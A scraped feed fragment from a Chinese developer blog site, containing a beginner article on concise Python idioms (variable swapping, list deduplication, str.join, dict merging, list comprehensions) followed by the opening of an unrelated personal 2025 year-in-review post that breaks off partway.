24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作为一个常年和 Python 打交道的 “搬砖人”，我发现很多新手甚至老手，都会忽略一些基础但超实用的小技巧。明明一行代码能搞定的事，非要写个循环绕半天，属实是给自己加工作量了。</p>
<p>今天就来分享几个我日常高频使用的 Python 基础操作，简单好记，用起来是真的香！</p>
<h2 data-id="heading-0">1. 交换变量？不用临时变量也能行</h2>
<p>新手交换两个变量，第一反应可能是定义一个临时变量中转：</p>
<pre><code class="hljs language-python" lang="python">a = <span class="hljs-number">10</span>
b = <span class="hljs-number">20</span>
<span class="hljs-comment"># 新手写法</span>
temp = a
a = b
b = temp
</code></pre>
<p>但 Python 里有更简洁的写法，直接一行搞定，逻辑还清晰：</p>
<pre><code class="hljs language-python" lang="python">a = <span class="hljs-number">10</span>
b = <span class="hljs-number">20</span>
<span class="hljs-comment"># 简洁写法</span>
a, b = b, a
</code></pre>
<p>不仅能交换两个变量，多个变量交换也同样适用，比如<code>a, b, c = c, a, b</code>，直接打乱顺序重新赋值，超方便。</p>
<h2 data-id="heading-1">2. 列表去重？别再写循环遍历了</h2>
<p>面对一个有重复元素的列表，想快速去重，很多人会写个 for 循环，逐个判断是否在新列表里。</p>
<pre><code class="hljs language-python" lang="python">lst = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
new_lst = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lst:
    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> new_lst:
        new_lst.append(i)
</code></pre>
<p>但其实用 Python 的集合特性，一行就能去重，效率还更高：</p>
<pre><code class="hljs language-python" lang="python">lst = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
new_lst = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(lst))
</code></pre>
<p>不过要注意，集合是无序的，如果需要保持原列表的顺序，可以用<code>dict.fromkeys(lst)</code>，再转成列表就行。</p>
<h2 data-id="heading-2">3. 快速拼接字符串？加号不如 join</h2>
<p>拼接多个字符串时，用<code>+</code>号虽然直观，但效率很低，尤其是字符串数量多的时候。</p>
<pre><code class="hljs language-python" lang="python">str_list = [<span class="hljs-string">"我"</span>, <span class="hljs-string">"爱"</span>, <span class="hljs-string">"Python"</span>, <span class="hljs-string">"编程"</span>]
result = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str_list:
    result += s
</code></pre>
<p>推荐用<code>join</code>方法，不仅代码简洁，执行效率也提升不少：</p>
<pre><code class="hljs language-python" lang="python">str_list = [<span class="hljs-string">"我"</span>, <span class="hljs-string">"爱"</span>, <span class="hljs-string">"Python"</span>, <span class="hljs-string">"编程"</span>]
result = <span class="hljs-string">""</span>.join(str_list)
</code></pre>
<p>如果想给字符串之间加个分隔符，比如逗号，直接把引号里的内容改成<code>,</code>就行，<code>","join(str_list)</code>就能得到<code>"我,爱,Python,编程"</code>。</p>
<h2 data-id="heading-3">4. 字典合并？三种方法任你选</h2>
<p>日常开发中经常需要合并两个字典，新手可能会用循环逐个添加，其实 Python 有好几种简洁的写法。</p>
<pre><code class="hljs language-python" lang="python">dict1 = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"张三"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">20</span>}
dict2 = {<span class="hljs-string">"gender"</span>: <span class="hljs-string">"男"</span>, <span class="hljs-string">"city"</span>: <span class="hljs-string">"北京"</span>}

<span class="hljs-comment"># 方法1：用update方法</span>
dict1.update(dict2)

<span class="hljs-comment"># 方法2：用**解包</span>
result = {**dict1, **dict2}

<span class="hljs-comment"># 方法3：Python3.9+ 可用|运算符</span>
result = dict1 | dict2
</code></pre>
<p>三种方法都能实现字典合并，需要注意的是，<code>update</code>会修改原字典，而另外两种方法会生成一个新字典，根据需求选择就行。</p>
<h2 data-id="heading-4">5. 快速生成列表？列表推导式 yyds</h2>
<p>想根据一个列表生成新的列表，比如把所有元素乘以 2，新手可能会写循环：</p>
<pre><code class="hljs language-python" lang="python">lst = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
new_lst = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lst:
    new_lst.append(i * <span class="hljs-number">2</span>)
</code></pre>
<p>用列表推导式的话，一行就能搞定，代码更紧凑：</p>
<pre><code class="hljs language-python" lang="python">lst = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
new_lst = [i * <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lst]
</code></pre>
<p>还能加上条件判断，比如只生成偶数的倍数：<code>[i * 2 for i in lst if i % 2 == 0]</code>，实用性拉满。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025年总结: 我还在往前走]]></title>    <link>https://juejin.cn/post/7589978645135294474</link>    <guid>https://juejin.cn/post/7589978645135294474</guid>    <pubDate>2026-01-01T07:38:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589978645135294474" data-draft-id="7589907831198859290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025年总结: 我还在往前走"/> <meta itemprop="keywords" content="前端,后端,全栈"/> <meta itemprop="datePublished" content="2026-01-01T07:38:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小佘ovo"/> <meta itemprop="url" content="https://juejin.cn/user/4248168663101239"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025年总结: 我还在往前走
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4248168663101239/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小佘ovo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T07:38:30.000Z" title="Thu Jan 01 2026 07:38:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>现在是2026年1月1号 04:00点, 新年快乐米娜桑, 新年陪第一根, 跨年也不知道怎么跨, 找不到人一起 , 下午5点就下班了 不知道干什么 就一直打游戏, 自己吃顿好的算了, 出去吃完夜宵回来之后 也不知道干什么, 算了写个2025年的总结吧 年年都写 迟早的事 哪怕输出的是一坨屎 也要输出, 365天 感觉每天都在熬夜 不是2点就是3点 要不就是通宵, Q3的时候也是进行了一波牛马跳槽, 去了一家自己想去的公司 做自己想做的业务, 换了一个城市 离开了呆了3年多的杭州，去苏州了 所谓上有天堂 下有苏杭 也是都去上了。</p>
</blockquote>
<ul>
<li>365天全勤掘金打卡 每天上班到工位就是打开掘金 进行打卡 已经养成习惯了 各位辛苦了 为了2025年 干杯</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c82d6415d9464869909e01bec7b0796d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=A8K9wYjiuOR2eReyGNAy5jUAn%2Bs%3D" alt="" width="46%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f7f3e145a8b4effb37aa594bbd371cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=viPv7KBpKFnkcffGpf7r23BjSvI%3D" alt="" width="50%" loading="lazy"/>
<h2 data-id="heading-0">工作</h2>
<h3 data-id="heading-1">回顾下Q1-Q3 第一家公司 干了什么事情</h3>
<ul>
<li>完成APP迭代任务 其他时间都是准备项目上的东西 纯混子</li>
